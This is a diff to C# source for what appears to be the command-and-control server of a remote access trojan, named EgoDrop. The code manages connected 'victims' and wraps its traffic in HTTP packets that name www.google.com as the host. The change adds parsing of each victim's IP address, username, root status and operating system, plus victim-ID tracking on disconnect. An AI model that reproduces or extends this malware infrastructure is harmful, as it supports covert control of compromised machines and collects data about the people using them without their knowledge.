@@ -85,6 +85,7 @@ namespace EgoDrop
                 NetworkStream stream = client.GetStream();
                 clsHttpPkt httpPkt = new clsHttpPkt("www.google.com", clsSqlite.enHttpMethod.POST, "/", "XX");
                 clsVictim victim = new clsVictim(client.Client, stream, httpPkt, this);
+                string szVictimID = string.Empty;
 
                 victim.fnHttpSend(1, 0, Convert.ToBase64String(victim.m_crypto.m_abRSAKeyPair.abPublicKey));
 
@@ -191,11 +192,18 @@ namespace EgoDrop
                                     }
 
                                     string szSrcVictimID = lsVictim.Last();
-
                                     fnOnReceivedMessage(victim, szSrcVictimID, lsMsg);
 
                                     if (lsMsg[0] == "info")
-                                        fnOnAddChain(lsVictim);
+                                    {
+                                        szVictimID = szSrcVictimID;
+                                        string szIPv4 = lsMsg[3];
+                                        string szUsername = lsMsg[5];
+                                        bool bRoot = string.Equals(lsMsg[7], "1");
+                                        string szOS = lsMsg[8];
+
+                                        fnOnAddChain(lsVictim, szOS, szUsername, bRoot,szIPv4);
+                                    }
                                 }
                             }
                         }
@@ -207,7 +215,7 @@ namespace EgoDrop
                 }
                 while (nRecv > 0);
 
-                fnOnVictimDisconnected(victim);
+                fnOnVictimDisconnected(victim, szVictimID);
             }
         }
 
